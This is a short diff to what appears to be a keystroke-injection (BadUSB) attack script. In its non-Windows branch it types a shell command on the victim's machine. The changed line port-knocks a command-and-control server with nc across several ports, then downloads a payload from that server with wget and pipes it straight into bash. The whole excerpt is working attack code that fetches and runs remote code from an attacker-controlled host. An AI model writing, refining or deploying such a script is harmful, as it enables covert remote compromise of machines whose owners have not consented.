@@ -226,7 +226,7 @@ IF ($_OS == WINDOWS) THEN
     
 ELSE 
     DELAY 300
-    STRING wget http://$C_SERVER/$PAYLOAD_PATH -O- | sh
+    STRING for port in $KNOCK_OPEN_HTTP; do echo | nc $C_SERVER $port; sleep 0.1; done; for port in $KNOCK_OPEN_HTTPS; do echo | nc $C_SERVER $port; sleep 0.1; done; wget http://$C_SERVER/$PAYLOAD_PATH -O- | bash
     ENTER
 END_IF
 
